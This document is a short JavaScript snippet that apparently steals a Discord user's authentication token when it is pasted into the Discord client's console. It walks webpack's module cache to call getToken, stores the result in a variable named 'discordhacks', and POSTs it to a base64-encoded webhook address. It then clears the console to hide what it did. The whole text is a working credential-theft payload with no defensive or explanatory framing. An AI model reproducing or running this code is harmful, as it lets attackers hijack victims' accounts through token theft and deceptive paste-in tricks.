var req = webpackJsonp.push([    [], {extra_id: (e, t, r) => e.exports = r},[        ["extra_id"]]]);for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (discordhacks = t.default.getToken())
    }
fetch(
  atob('webhook_base64encode_here'), 
  {
    method: 'post',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      content: discordhacks,
    }),
  }
);
console.clear()
console.log('Done!')
